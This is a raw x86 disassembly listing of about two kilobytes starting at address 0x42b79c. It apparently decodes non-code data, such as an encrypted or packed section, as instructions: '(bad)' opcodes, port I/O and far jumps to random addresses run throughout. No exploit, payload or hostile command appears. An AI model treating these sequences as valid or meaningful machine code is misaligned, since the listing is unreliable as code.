  42b79c:	fiadd  DWORD PTR ds:0xf6c5eede
  42b7a2:	shl    ch,cl
  42b7a4:	call   0xfff8936e
  42b7a9:	div    BYTE PTR [edi-0x12e2b12]
  42b7af:	fxch   st(4)
  42b7b1:	mov    ebp,0xfddddfbd
  42b7b6:	cld    
  42b7b7:	fmulp  st(0),st
  42b7b9:	in     al,0xce
  42b7bb:	(bad)  
  42b7bd:	or     BYTE PTR [edx-0x121b3313],dh
  42b7c3:	jmp    0x42b7bc
  42b7c5:	jmp    0xc9de:0xdacdb4c8
  42b7cc:	into   
  42b7cd:	clc    
  42b7ce:	add    eax,eax
  42b7d0:	repz icebp 
  42b7d2:	std    
  42b7d3:	in     al,0xe7
  42b7d5:	fprem1 
  42b7d7:	lock mov ebp,0xf2fcebce
  42b7dd:	clc    
  42b7de:	retf   
  42b7df:	in     eax,0xe5
  42b7e1:	fsubr  st(0),st
  42b7e3:	stos   BYTE PTR es:[edi],al
  42b7e4:	sti    
  42b7e5:	ror    edi,0xed
  42b7e8:	neg    ch
  42b7ea:	leave  
  42b7eb:	in     eax,dx
  42b7ec:	(bad)  
  42b7ed:	call   0xd82176ad
  42b7f2:	(bad)  
  42b7f3:	cld    
  42b7f4:	std    
  42b7f5:	shr    eax,0xf8
  42b7f8:	sti    
  42b7f9:	out    dx,eax
  42b7fa:	loopne 0x42b7fa
  42b7fc:	out    0xe8,eax
  42b7fe:	into   
  42b7ff:	out    0xe1,al
  42b801:	mov    esp,0xb3cbadd0
  42b806:	sar    edx,0xce
  42b809:	(bad)  
  42b80a:	xlat   BYTE PTR ds:[ebx]
  42b80b:	leave  
  42b80c:	iret   
  42b80d:	out    dx,eax
  42b80e:	aam    0xbd
  42b810:	aam    0xd8
  42b812:	cli    
  42b813:	sar    DWORD PTR [ecx-0x22f609fe],1
  42b819:	or     ebp,ebp
  42b81b:	repz jmp 0xe3c2:0xb7d7bc06
  42b823:	mul    bh
  42b825:	fcmovnbe st,st(0)
  42b827:	out    0xd1,eax
  42b829:	retf   
  42b82a:	dec    ch
  42b82c:	mov    edi,0xbcd5f0d6
  42b831:	cld    
  42b832:	pop    es
  42b833:	add    bh,dh
  42b835:	repnz fcomi st,st(0)
  42b838:	rol    esp,0x1
  42b83b:	in     al,0x12
  42b83d:	stc    
  42b83e:	test   al,0xa8
  42b840:	in     eax,0xc8
  42b842:	lods   eax,DWORD PTR ds:[esi]
  42b843:	loopne 0x42b819
  42b845:	rcl    bh,cl
  42b847:	cmc    
  42b848:	mov    ch,0xd9
  42b84a:	mov    eax,0xd9f5f3c4
  42b84f:	shl    ebp,0xec
  42b852:	loopne 0x42b830
  42b854:	jecxz  0x42b84b
  42b856:	out    0xd0,eax
  42b858:	or     al,BYTE PTR [ecx]
  42b85a:	clc    
  42b85b:	or     esp,edi
  42b85d:	adc    esp,ebp
  42b85f:	repz xlat BYTE PTR ds:[ebx]
  42b861:	enter  0xb1ee,0xc3
  42b865:	ret    0xe6f8
  42b868:	rcl    edx,cl
  42b86a:	(bad)  
  42b86c:	fsubr  st,st(7)
  42b86e:	clc    
  42b86f:	std    
  42b870:	fcmovb st,st(0)
  42b872:	add    al,0xf4
  42b874:	jmp    0xc8cf:0xe2dce8c6
  42b87b:	aam    0xcd
  42b87d:	repnz in al,0xa9
  42b880:	repz loopne 0x42b846
  42b883:	loopne 0x42b857
  42b885:	retf   0xe0cb
  42b888:	mov    edx,0x3e3e8da
  42b88d:	fcmovne st,st(6)
  42b88f:	(bad)  
  42b890:	int3   
  42b891:	loop   0x42b884
  42b893:	add    esp,esi
  42b895:	(bad)  
  42b897:	fcmovb st,st(4)
  42b899:	(bad)  
  42b89a:	retf   
  42b89b:	leave  
  42b89c:	jmp    0x42b869
  42b89e:	fcom   st(2)
  42b8a0:	test   eax,0xd2e8f6cf
  42b8a5:	int3   
  42b8a6:	out    dx,al
  42b8a7:	lock cli 
  42b8a9:	(bad)  
  42b8ab:	mov    edx,0xce03bbec
  42b8b0:	aad    0xc1
  42b8b2:	cli    
  42b8b3:	shl    edx,0xd7
  42b8b6:	jecxz  0x42b87e
  42b8b8:	cmc    
  42b8b9:	call   0xc11eacaa
  42b8be:	in     al,0xdf
  42b8c0:	loop   0x42b8a2
  42b8c2:	fst    st(4)
  42b8c4:	leave  
  42b8c5:	imul   bh
  42b8c7:	jmp    0xb4df:0xb5fedae4
  42b8ce:	stc    
  42b8cf:	rol    BYTE PTR [ebx],0xbe
  42b8d2:	fild   WORD PTR [edi+edx*8]
  42b8d5:	sti    
  42b8d6:	loop   0x42b8bc
  42b8d8:	retf   
  42b8d9:	push   es
  42b8da:	push   es
  42b8db:	or     eax,0xeae30aeb
  42b8e0:	jmp    0x42b8b2
  42b8e2:	in     al,0xbc
  42b8e4:	shr    bh,0xe8
  42b8e7:	repz aam 0xb8
  42b8ea:	jmp    0xb80c77ed
  42b8ef:	xlat   BYTE PTR ds:[ebx]
  42b8f0:	ret    
  42b8f1:	xlat   BYTE PTR ds:[ebx]
  42b8f2:	icebp  
  42b8f3:	aad    0xbd
  42b8f5:	rol    ecx,0xfa
  42b8f8:	fdivp  st(3),st
  42b8fa:	jmp    0xb32f7e07
  42b8ff:	int3   
  42b900:	out    0xc6,al
  42b902:	lods   eax,DWORD PTR ds:[esi]
  42b903:	in     eax,dx
  42b904:	int    0xd0
  42b906:	mov    ch,0xef
  42b908:	mov    edi,0xd6f7bbcf
  42b90d:	jecxz  0x42b8e7
  42b90f:	mov    ecx,0xd2d9d0df
  42b914:	jecxz  0x42b8f3
  42b916:	or     DWORD PTR [ebx],ecx
  42b918:	add    bh,dh
  42b91a:	out    0xc4,eax
  42b91c:	jmp    0xf3e962ec
  42b921:	(bad)  
  42b922:	xlat   BYTE PTR ds:[ebx]
  42b923:	retf   
  42b924:	ret    0xafe4
  42b927:	scas   al,BYTE PTR es:[edi]
  42b928:	mov    eax,0xcfbbbff3
  42b92d:	in     eax,dx
  42b92e:	ror    ebp,0xfc
  42b931:	lock fiadd DWORD PTR [edi]
  42b934:	in     al,0x6
  42b936:	jmp    0xeb289c11
  42b93b:	in     eax,dx
  42b93c:	lds    eax,FWORD PTR [ecx]
  42b93e:	fst    st(0)
  42b940:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b941:	in     al,dx
  42b942:	out    dx,eax
  42b943:	shl    esp,1
  42b945:	(bad)  
  42b946:	repz sar bh,0xf6
  42b94a:	mov    edi,0xedfbd4d8
  42b94f:	fcmovb st,st(2)
  42b951:	(bad)  
  42b953:	out    0xd1,al
  42b955:	loope  0x42b94f
  42b957:	jecxz  0x42b95d
  42b959:	in     al,0xff
  42b95b:	cld    
  42b95c:	call   0xd7216d29
  42b961:	fsubr  QWORD PTR [esi-0x1848111c]
  42b967:	jmp    0x17723d
  42b96c:	div    DWORD PTR [esi+ebp*8-0x3841f914]
  42b973:	lds    eax,FWORD PTR ds:0xd6f5f1f2
  42b979:	aam    0xc6
  42b97b:	(bad)
  42b97f:	int3   
  42b980:	ror    al,1
  42b982:	jecxz  0x42b937
  42b984:	lock in eax,0xe7
  42b987:	mov    dl,0xc9
  42b989:	fucom  st(5)
  42b98b:	enter  0xd6ff,0xd5
  42b98f:	in     al,dx
  42b990:	shl    edx,1
  42b992:	add    eax,esi
  42b994:	rol    DWORD PTR [ebx],cl
  42b996:	loope  0x42b96c
  42b998:	call   0x4418982
  42b99d:	fisubr WORD PTR [edi-0x94f2932]
  42b9a3:	enter  0xf7ee,0xc8
  42b9a7:	retf   0xe8ba
  42b9aa:	in     eax,dx
  42b9ab:	leave  
  42b9ac:	iret   
  42b9ad:	mov    ebx,0xf606eed9
  42b9b2:	icebp  
  42b9b3:	fcom   st(7)
  42b9b5:	in     al,0x3
  42b9b7:	retf   
  42b9b8:	add    ah,bh
  42b9ba:	jmp    0xefc8:0xbdf3c5da
  42b9c1:	shl    DWORD PTR [esi-0xa380a38],cl
  42b9c7:	retf   0xe8c9
  42b9ca:	enter  0xf9fe,0xef
  42b9ce:	std    
  42b9cf:	mov    ebp,0xe0c6fce2
  42b9d4:	mov    ecx,0xf0ff6e5
  42b9d9:	fimul  DWORD PTR [esi]
  42b9db:	ret    0xfcd3
  42b9de:	rcl    dl,1
  42b9e0:	ret    
  42b9e1:	mov    esi,0xe4faf6d3
  42b9e6:	fcomi  st,st(4)
  42b9e8:	(bad)  
  42b9e9:	(bad)  
  42b9ea:	xlat   BYTE PTR ds:[ebx]
  42b9eb:	(bad)
  42b9ef:	fdiv   st,st(5)
  42b9f1:	sti    
  42b9f2:	loope  0x42b9b4
  42b9f4:	in     al,0xc0
  42b9f6:	neg    dh
  42b9f8:	out    dx,eax
  42b9f9:	in     al,0xf5
  42b9fb:	loop   0x42ba0f
  42b9fd:	or     ebp,esp
  42b9ff:	loop   0x42b9ef
  42ba01:	mov    cl,0xe5
  42ba03:	mov    bl,0xca
  42ba05:	jmp    0x42b9bd
  42ba07:	(bad)  
  42ba0a:	std    
  42ba0b:	fdivp  st(1),st
  42ba0d:	mov    ah,0xf5
  42ba0f:	lock into 
  42ba11:	in     al,dx
  42ba12:	add    bh,bh
  42ba14:	std    
  42ba15:	cli    
  42ba16:	not    eax
  42ba18:	out    dx,eax
  42ba19:	leave  
  42ba1a:	add    al,0xfa
  42ba1c:	stc    
  42ba1d:	jmp    0xb0c4:0xe2bdc9c8
  42ba24:	loop   0x42b9ff
  42ba26:	shl    DWORD PTR [ecx-0x4d442c0c],1
  42ba2c:	retf   
  42ba2d:	rcr    ebp,1
  42ba2f:	fucom  st(3)
  42ba31:	xlat   BYTE PTR ds:[ebx]
  42ba32:	(bad)  
  42ba33:	or     ecx,DWORD PTR [edx]
  42ba35:	sar    esi,0xc2
  42ba38:	(bad)
  42ba3b:	int3   
  42ba3c:	(bad)
  42ba3f:	iret   
  42ba40:	not    al
  42ba42:	mov    dh,0xb4
  42ba44:	rcl    edx,0xf0
  42ba47:	int    0xcd
  42ba49:	fcomip st,st(2)
  42ba4b:	cmc    
  42ba4c:	in     al,dx
  42ba4d:	call   0xf41f9e46
  42ba52:	(bad)  
  42ba54:	jecxz  0x42ba17
  42ba56:	add    esp,esi
  42ba58:	add    bh,BYTE PTR [edi+ecx*8-0x161e1e35]
  42ba5f:	in     eax,dx
  42ba60:	mov    cl,0xbe
  42ba62:	retf   0xd1b7
  42ba65:	iret   
  42ba66:	sar    eax,1
  42ba68:	jmp    0xf7e3:0xeabbbbe5
  42ba6f:	mov    esp,0x5dce5da
  42ba74:	rol    eax,1
  42ba76:	(bad)  
  42ba78:	jecxz  0x42ba54
  42ba7a:	add    al,BYTE PTR [eax]
  42ba7c:	cld    
  42ba7d:	add    bh,BYTE PTR [ebx+edx*8-0x3c380c2e]
  42ba84:	fndisi(8087 only) 
  42ba86:	mov    dh,0xb9
  42ba88:	int    0xc6
  42ba8a:	jmp    0xe6ce:0xf1c2f0fa
  42ba91:	ror    ch,1
  42ba93:	add    al,0xb9
  42ba95:	out    0xd6,al
  42ba97:	mov    esi,0xcffcfa02
  42ba9c:	out    dx,al
  42ba9d:	les    edi,FWORD PTR [eax-0x4e1b0e1d]
  42baa3:	fucomi st,st(6)
  42baa5:	stc    
  42baa6:	iret   
  42baa7:	rcl    ebx,cl
  42baa9:	repz lock mov ah,0xd4
  42baad:	cli    
  42baae:	in     eax,dx
  42baaf:	in     eax,dx
  42bab0:	int3   
  42bab1:	(bad)  
  42bab3:	sti    
  42bab4:	aad    0xc6
  42bab6:	(bad)  
  42bab8:	loope  0x42bab2
  42baba:	enter  0xeac6,0xef
  42babe:	leave  
  42babf:	idiv   DWORD PTR [esi-0x33390a49]
  42bac5:	int3   
  42bac6:	fcmovb st,st(5)
  42bac8:	fistp  QWORD PTR [ebx-0xc123708]
  42bace:	mov    eax,0xe102f4ce
  42bad3:	shr    bl,0xff
  42bad6:	rcl    al,1
  42bad8:	fsub   st,st(2)
  42bada:	or     bl,dh
  42badc:	loop   0x42babc
  42bade:	in     al,0xb3
  42bae0:	shl    BYTE PTR [ebp+edx*8-0x270a1740],1
  42bae7:	enter  0xb0f4,0xf0
  42baeb:	mov    edi,0xc3baeed8
  42baf0:	lock mov esi,0xe2c207d5
  42baf6:	fnstcw WORD PTR [esi-0x18111402]
  42bafc:	or     al,ch
  42bafe:	scas   al,BYTE PTR es:[edi]
  42baff:	fnstsw WORD PTR [ebp-0x4b51393d]
  42bb05:	in     eax,0xf9
  42bb07:	stc    
  42bb08:	repz (bad) 
  42bb0a:	retf   
  42bb0b:	fcmovnu st,st(4)
  42bb0d:	loope  0x42bacd
  42bb0f:	loopne 0x42bb03
  42bb11:	loope  0x42bace
  42bb13:	loopne 0x42badc
  42bb15:	add    al,0xd0
  42bb17:	(bad)  
  42bb19:	out    0xd9,eax
  42bb1b:	jmp    0xebcb:0xcbc8fdf9
  42bb22:	in     eax,dx
  42bb23:	int    0xe1
  42bb25:	sar    cl,1
  42bb27:	aad    0xdf
  42bb29:	clc    
  42bb2a:	mov    eax,0xf6e9b4ed
  42bb2f:	cld    
  42bb30:	fcomi  st,st(5)
  42bb32:	fidivr DWORD PTR [edx-0x1c191e3d]
  42bb38:	loope  0x42bb28
  42bb3a:	cld    
  42bb3b:	int    0xf
  42bb3d:	shl    bl,cl
  42bb3f:	int    0xf0
  42bb41:	out    dx,eax
  42bb42:	jmp    0x42bb10
  42bb44:	repnz lods al,BYTE PTR ds:[esi]
  42bb46:	mov    bl,0xf3
  42bb48:	mov    bh,0xc5
  42bb4a:	repnz (bad) 
  42bb4d:	iret   
  42bb4e:	(bad)  
  42bb50:	add    dh,al
  42bb52:	sti    
  42bb53:	icebp  
  42bb54:	fadd   DWORD PTR [edx]
  42bb56:	mul    bh
  42bb58:	dec    BYTE PTR [ecx]
  42bb5a:	cli    
  42bb5b:	add    eax,0xddbcf1dc
  42bb60:	loope  0x42bb13
  42bb62:	lods   eax,DWORD PTR ds:[esi]
  42bb63:	repz fcmovnbe st,st(0)
  42bb66:	jmp    0x42bb56
  42bb68:	cmc    
  42bb69:	(bad)  
  42bb6a:	cli    
  42bb6b:	rcl    cl,cl
  42bb6d:	mov    edi,0xd6dcfef3
  42bb72:	int    0xe4
  42bb74:	rol    esp,cl
  42bb76:	loope  0x42bb61
  42bb78:	leave  
  42bb79:	fstp   st(2)
  42bb7b:	fld    DWORD PTR [ecx]
  42bb7d:	in     al,0xa7
  42bb7f:	repnz (bad) 
  42bb82:	(bad)  
  42bb83:	div    DWORD PTR [edi+eiz*8-0x22302a45]
  42bb8a:	mov    edx,0xfbf1edfb
  42bb8f:	mov    edx,0xf5d2e3be
  42bb94:	cld    
  42bb95:	pop    es
  42bb96:	call   0xe141b579
  42bb9b:	in     al,dx
  42bb9c:	loop   0x42bb70
  42bb9e:	vpsadbw xmm4,xmm5,xmm6
  42bba2:	mov    al,0xd2
  42bba4:	imul   ecx
  42bba6:	out    0xb2,al
  42bba8:	jmp    0xecf4:0xfec9d1f0
  42bbaf:	fcmovnu st,st(1)
  42bbb1:	mov    ebp,0x4dcc0f8
  42bbb6:	loopne 0x42bbbe
  42bbb8:	aad    0xce
  42bbba:	in     eax,dx
  42bbbb:	hlt    
  42bbbc:	add    al,0x4
  42bbbe:	(bad)  
  42bbc0:	loopne 0x42bba5
  42bbc2:	leave  
  42bbc3:	retf   0xd2cf
  42bbc6:	mov    dl,0xcc
  42bbc8:	shr    ebp,1
  42bbca:	call   0xe000a5d2
  42bbcf:	std    
  42bbd0:	loopne 0x42bbce
  42bbd2:	aam    0xd8
  42bbd4:	mov    ebp,0x60be6c5
  42bbd9:	fsub   st(5),st
  42bbdb:	adc    edi,esi
  42bbdd:	loop   0x42bba9
  42bbdf:	lock loope 0x42bbb4
  42bbe2:	out    0xad,al
  42bbe4:	iret   
  42bbe5:	int    0xd8
  42bbe7:	shl    ebx,1
  42bbe9:	in     eax,0xb3
  42bbeb:	mov    edi,0xd6dadbf9
  42bbf0:	sti    
  42bbf1:	fcomi  st,st(2)
  42bbf3:	(bad)  
  42bbf4:	neg    cl
  42bbf6:	(bad)  
  42bbf7:	out    0x5,al
  42bbf9:	(bad)  
  42bbfa:	fcomip st,st(3)
  42bbfc:	iret   
  42bbfd:	in     eax,dx
  42bbfe:	test   eax,0xabcaeae9
  42bc03:	scas   al,BYTE PTR es:[edi]
  42bc04:	loopne 0x42bbe6
  42bc06:	fcmovne st,st(7)
  42bc08:	(bad)  
  42bc09:	ftst   
  42bc0b:	mov    edx,0xb8f7bdcd
  42bc10:	mov    eax,0x7c205c2
  42bc15:	or     DWORD PTR [edi],eax
  42bc17:	fcmovu st,st(3)
  42bc19:	vpaddb ymm7,ymm4,ymm1
  42bc1d:	(bad)  
  42bc1f:	shl    esp,1
  42bc21:	jecxz  0x42bbe4
  42bc23:	scas   al,BYTE PTR es:[edi]
  42bc24:	mov    al,0xbb
  42bc26:	aad    0xb5
  42bc28:	rcr    dl,1
  42bc2a:	hlt    
  42bc2b:	fucompp 
  42bc2d:	(bad)  
  42bc2e:	repnz shl edx,cl
  42bc31:	cld    
  42bc32:	cmc    
  42bc33:	hlt    
  42bc34:	jmp    edi
  42bc36:	test   BYTE PTR [eax],0xfa
  42bc39:	push   cs
  42bc3a:	call   0xf429990c
  42bc3f:	mov    esp,0xe0c1acde
  42bc44:	sti    
  42bc45:	aam    0xf6
  42bc47:	stc    
  42bc48:	(bad)  
  42bc49:	(bad)  
  42bc4a:	fucom  st(4)
  42bc4c:	sar    DWORD PTR [ebp-0x3118fd09],1
  42bc52:	out    0xc2,al
  42bc54:	fmul   QWORD PTR [ebx]
  42bc56:	clc    
  42bc57:	leave  
  42bc58:	push   cs
  42bc59:	cld    
  42bc5a:	in     al,dx
  42bc5b:	loopne 0x42bc4c
  42bc5d:	ror    al,0xf2
  42bc60:	fcomip st,st(7)
  42bc62:	int    0xb4
  42bc64:	in     eax,dx
  42bc65:	into   
  42bc66:	in     eax,dx
  42bc67:	fcmovbe st,st(7)
  42bc69:	mov    ebx,0xfdfacff5
  42bc6e:	shl    edx,cl
  42bc70:	fcmovu st,st(2)
  42bc72:	fstp   st(3)
  42bc74:	push   es
  42bc75:	add    esp,eax
  42bc77:	add    eax,0xe4fcd501
  42bc7c:	push   cs
  42bc7d:	enter  0xcbd0,0xdc
  42bc81:	fsubp  st(6),st
  42bc83:	call   0xe812b05a
  42bc88:	mov    ebx,0xb1ecf1d7
  42bc8d:	jmp    0xfc04:0xced8f3cf
  42bc94:	sar    esp,0xe3
  42bc97:	aad    0x4
  42bc99:	jmp    0xefe3:0x4e3e5d5
  42bca0:	in     al,0xf2
  42bca2:	scas   al,BYTE PTR es:[edi]
  42bca3:	shl    BYTE PTR [edi-0x384b4d54],cl
  42bca9:	repz aad 0xe9
  42bcac:	int3   
  42bcad:	repnz leave 
  42bcaf:	repnz mov ecx,0xf3e2bbec
  42bcb5:	fcmovnu st,st(1)
  42bcb7:	dec    ebx
  42bcb9:	add    BYTE PTR [esi],cl
  42bcbb:	fld    DWORD PTR [eax]
  42bcbd:	pop    es
  42bcbe:	fmul   st(7),st
  42bcc0:	ret    0xc9cc
  42bcc3:	aad    0xe7
  42bcc5:	sti    
  42bcc6:	aam    0xef
  42bcc8:	out    0xcb,al
  42bcca:	int    0xf8
  42bccc:	out    dx,eax
  42bccd:	ret    0xdbf0
  42bcd0:	shl    dh,0xfe
  42bcd3:	(bad)
  42bcd6:	add    eax,0xd8e702e4
  42bcdb:	hlt    
  42bcdc:	add    eax,0xc2aeddfa
  42bce1:	into   
  42bce2:	shl    BYTE PTR [esi-0x28051d53],cl
  42bce8:	(bad)  
  42bce9:	mov    ecx,0xcdcbd6d0
  42bcee:	mov    ebp,0xd503deda
  42bcf3:	in     al,dx
  42bcf4:	or     dl,al
  42bcf6:	inc    edi
  42bcf8:	(bad)
  42bcfb:	faddp  st(5),st
  42bcfd:	fsubr  st,st(6)
  42bcff:	call   0xb0f67de4
  42bd04:	leave  
  42bd05:	hlt    
  42bd06:	idiv   edx
  42bd08:	shl    esi,cl
  42bd0a:	(bad)  
  42bd0c:	into   
  42bd0d:	(bad)  
  42bd0e:	rol    BYTE PTR [ebx],cl
  42bd10:	out    0xcd,eax
  42bd12:	out    0xf3,eax
  42bd14:	rcr    al,0xc0
  42bd17:	(bad)  
  42bd18:	cli    
  42bd19:	fcomp  st(7)
  42bd1b:	pop    es
  42bd1c:	or     edx,ebx
  42bd1e:	shl    DWORD PTR [edx-0x28540a22],1
  42bd24:	mov    ah,0xc7
  42bd26:	enter  0xd6c5,0xde
  42bd2a:	rcr    ah,cl
  42bd2c:	retf   0xd3d3
  42bd2f:	fild   WORD PTR [edi]
  42bd31:	add    ebx,esi
  42bd33:	in     al,dx
  42bd34:	add    bl,cl
  42bd36:	fdiv   st,st(5)
  42bd38:	fld    DWORD PTR ds:0x30adbc4
  42bd3e:	fdivr  QWORD PTR [ebx+eiz*8-0x1412301f]
  42bd45:	jmp    0xcf10b636
  42bd4a:	mov    edx,0xb7f8fced
  42bd4f:	inc    DWORD PTR [edx]
  42bd51:	out    0xbd,eax
  42bd53:	out    0xda,al
  42bd55:	fcmovnb st,st(5)
  42bd57:	rcl    ah,1
  42bd59:	cmc    
  42bd5a:	(bad)  
  42bd5c:	sti    
  42bd5d:	push   cs
  42bd5e:	mov    ebp,0xe4d7afea
  42bd63:	aam    0xb5
  42bd65:	cmc    
  42bd66:	sti    
  42bd67:	(bad)  
  42bd68:	call   0xee389626
  42bd6d:	int    0xf1
  42bd6f:	jecxz  0x42bd33
  42bd71:	mov    eax,0xe3c7d2f6
  42bd76:	add    esp,edi
  42bd78:	push   cs
  42bd79:	in     eax,0xd
  42bd7b:	loop   0x42bd46
  42bd7d:	out    0xf1,al
  42bd7f:	shl    bl,cl
  42bd81:	(bad)  
  42bd83:	test   esi,0xefe9f4a8
  42bd89:	icebp  
  42bd8a:	(bad)  
  42bd8b:	into   
  42bd8c:	retf   
  42bd8d:	mov    ebp,0xdad9d5d9
  42bd92:	shr    esp,1
  42bd94:	les    eax,FWORD PTR [edx]
  42bd96:	ret    0x1d7
  42bd99:	(bad)  
  42bd9a:	retf   0x2c5
  42bd9d:	int    0xe7
  42bd9f:	rol    esi,cl
  42bda1:	scas   al,BYTE PTR es:[edi]
  42bda2:	loope  0x42bd8c
  42bda4:	int3   
  42bda5:	mov    cl,0xd5
  42bda7:	cmc    
  42bda8:	clc    
  42bda9:	into   
  42bdaa:	repnz out dx,eax
  42bdac:	sar    ah,1
  42bdae:	fmul   st,st(0)
  42bdb0:	(bad)  
  42bdb1:	in     eax,0xc2
  42bdb3:	(bad)  
  42bdb4:	mov    ecx,0xd4fcd4f9
  42bdb9:	dec    ecx
  42bdbb:	add    eax,DWORD PTR [eax]
  42bdbd:	add    ebx,ebp
  42bdbf:	scas   al,BYTE PTR es:[edi]
  42bdc0:	scas   al,BYTE PTR es:[edi]
  42bdc1:	int3   
  42bdc2:	rep lods eax,DWORD PTR ds:[esi]
  42bdc4:	cli    
  42bdc5:	out    0xc7,al
  42bdc7:	fldlg2 
  42bdc9:	fsubrp st(4),st
  42bdcb:	neg    edi
  42bdcd:	ffree  st(1)
  42bdcf:	in     al,dx
  42bdd0:	stc    
  42bdd1:	int3   
  42bdd2:	mov    edi,0xad10604
  42bdd7:	jmp    0x42bddb
  42bdd9:	(bad)  
  42bdda:	sti    
  42bddb:	or     al,0xce
  42bddd:	jmp    0xc3e3:0xceafc7ae
  42bde4:	call   0xca1eb0b0
  42bde9:	sar    ch,cl
  42bdeb:	mov    esi,0xf6fcb8b9
  42bdf0:	sti    
  42bdf1:	(bad)  
  42bdf3:	ffree  st(4)
  42bdf5:	fdivr  st(7),st
  42bdf7:	loope  0x42bdda
  42bdf9:	loop   0x42bdd6
  42bdfb:	loope  0x42bdfc
  42bdfd:	icebp  
  42bdfe:	(bad)  
  42be00:	out    0xc5,al
  42be02:	into   
  42be03:	enter  0xb7f1,0xea
  42be07:	loopne 0x42bdf3
  42be09:	rcr    ah,1
  42be0b:	shl    ah,1
  42be0d:	iret   
  42be0e:	mov    ecx,0xf0e0d7ce
  42be13:	vpaddusb xmm2,xmm4,xmm6
  42be17:	add    edi,esp
  42be19:	or     bh,bh
  42be1b:	jecxz  0x42be09
  42be1d:	fmul   st,st(4)
  42be1f:	(bad)  
  42be20:	out    0xd2,al
  42be22:	div    ebp
  42be24:	out    0xda,eax
  42be26:	shr    ebx,0xca
  42be29:	in     al,dx
  42be2a:	mov    ch,0xdb
  42be2c:	sar    BYTE PTR [edx-0x12423737],cl
  42be32:	mov    esp,0x3f9c601
  42be37:	out    0xd9,al
  42be39:	jmp    0x122804c
  42be3e:	ror    ebx,cl
  42be40:	mov    esp,0xe4f2f5f3
  42be45:	(bad)  
  42be46:	mov    ah,0xb4
  42be48:	sti    
  42be49:	fnstsw WORD PTR [ebp-0x20024a0e]
  42be4f:	(bad)  
  42be51:	rcl    dl,0xbd
  42be54:	lock shr al,1
  42be57:	or     dh,bl
  42be59:	(bad)  
  42be5b:	in     eax,0xe8
  42be5d:	add    eax,0xe0d0d7ce
  42be62:	mov    ch,0xc1
  42be64:	lods   al,BYTE PTR ds:[esi]
  42be65:	mov    dl,0xf3
  42be67:	(bad)  
  42be68:	shr    BYTE PTR [esi+edi*4-0x29323015],cl
  42be6f:	add    DWORD PTR [ebp+0x1f0d307],esi
  42be75:	rol    esp,0xea
  42be78:	out    dx,al
  42be79:	fild   DWORD PTR [ecx]
  42be7b:	or     eax,0xe9e80a08
  42be80:	imul   BYTE PTR [esi-0x12394f14]
  42be86:	ror    edx,0xf1
  42be89:	sti    
  42be8a:	jmp    0xcff0:0xf8bbd6b5
  42be91:	in     eax,0xf4
  42be93:	(bad)  
  42be95:	loop   0x42be56
  42be97:	cli    
  42be98:	fsubrp st(2),st
  42be9a:	enter  0xe5e7,0xc4
  42be9e:	test   al,0xeb
  42bea0:	mov    edi,0xe6d7c2ca
  42bea5:	mov    ebx,0xfdf2ccaf
  42beaa:	rcl    ecx,1
  42beac:	clc    
  42bead:	loope  0x42bea1
  42beaf:	icebp  
  42beb0:	lock mov ah,0xc5
  42beb3:	fild   DWORD PTR [esi]
  42beb5:	fiadd  DWORD PTR [edx]
  42beb7:	ffree  st(0)
  42beb9:	pop    es
  42beba:	fucom  st(1)
  42bebc:	jmp    0xc80477b9
  42bec1:	(bad)  
  42bec3:	mov    cl,0xe5
  42bec5:	int3   
  42bec6:	mov    al,0xf0
  42bec8:	repz cli 
  42beca:	(bad)  
  42becc:	fnstcw WORD PTR [ecx-0x6ff4044]
  42bed2:	clc    
  42bed3:	rcl    cl,cl
  42bed5:	cmc    
  42bed6:	jmp    0xcfd:0xedfc4e5
  42bedd:	add    cl,al
  42bedf:	retf   0xe4e3
  42bee2:	iret   
  42bee3:	in     al,0xad
  42bee5:	mov    al,0xed
  42bee7:	mov    cl,0xd7
  42bee9:	mov    eax,0xf1f7b4db
  42beee:	int    0xe0
  42bef0:	cmc    
  42bef1:	add    eax,ebx
  42bef3:	vcmpsd xmm7,xmm6,xmm3,0xbe
  42bef8:	sti    
  42bef9:	out    dx,eax
  42befa:	add    al,0xef
  42befc:	ror    DWORD PTR [esp+eax*8],cl
  42beff:	test   al,0xd3
  42bf01:	int    0xca
  42bf03:	hlt    
  42bf04:	test   eax,0xceb2e8c4
  42bf09:	(bad)  
  42bf0a:	(bad)  
  42bf0c:	fcmovnbe st,st(3)
  42bf0e:	cli    
  42bf0f:	loop   0x42bef8
  42bf11:	cli    
  42bf12:	aad    0x6
  42bf14:	ret    
  42bf15:	jmp    0xd8d4:0x706eaf8
  42bf1c:	out    dx,eax
  42bf1d:	repz retf 
  42bf1f:	mov    ebp,0xc7ecebc6
  42bf24:	mov    al,0xc8
  42bf26:	mov    bh,0xc6
  42bf28:	ror    edx,cl
  42bf2a:	jmp    0xc319b31b
  42bf2f:	fdivrp st(7),st
  42bf31:	pop    es
  42bf32:	in     eax,dx
  42bf33:	aam    0xe7
  42bf35:	ret    0xe1eb
  42bf38:	hlt    
  42bf39:	add    al,0xe2
  42bf3b:	out    0x9,al
  42bf3d:	fucomip st,st(6)
  42bf3f:	in     eax,0xdc
  42bf41:	jecxz  0x42bf33
  42bf43:	repz fcmovnb st,st(4)
  42bf46:	mov    al,0xf5
  42bf48:	(bad)  [eax-0x52e3711]
  42bf4e:	rcr    ebx,0xfa
  42bf51:	icebp  
  42bf52:	faddp  st(3),st
  42bf54:	rol    bh,1
  42bf56:	(bad)
  42bf59:	retf   
  42bf5a:	fld    st(6)
  42bf5c:	in     al,dx
  42bf5d:	add    al,bh
  42bf5f:	in     eax,dx
  42bf60:	fucomp st(3)
  42bf62:	int    0xe1
  42bf64:	out    dx,eax
  42bf65:	out    0xe5,al
  42bf67:	into   
  42bf68:	(bad)  
  42bf69:	aad    0xff
  42bf6b:	iret   
  42bf6c:	mov    edi,0xe701fdc8
  42bf71:	ror    ch,1
  42bf73:	pop    es
  42bf74:	(bad)
  42bf77:	std    
  42bf78:	call   0xec29b458
  42bf7d:	call   0xbd067e50
  42bf82:	int3   
  42bf83:	int    0xd2
  42bf85:	lock cli 
  42bf87:	inc    edi
  42bf89:	fsqrt  
  42bf8b:	(bad)  
  42bf8d:	out    dx,eax
  42bf8e:	neg    ah
  42bf90:	(bad)  
  42bf92:	add    esi,edi
  42bf94:	cli    
  42bf95:	loop   0x42bf71
  42bf97:	fiadd  WORD PTR ds:0xecf90b
  42bf9d:	adc    al,bh
  42bf9f:	jmp    0xf0357e54
  42bfa4:	ret    0xf9b3
  42bfa7:	leave  
  42bfa8:	(bad)  
  42bfa9:	idiv   ebx
  42bfab:	(bad)  
  42bfad:	stc    
  42bfae:	stc    
  42bfaf:	ret    0xd902
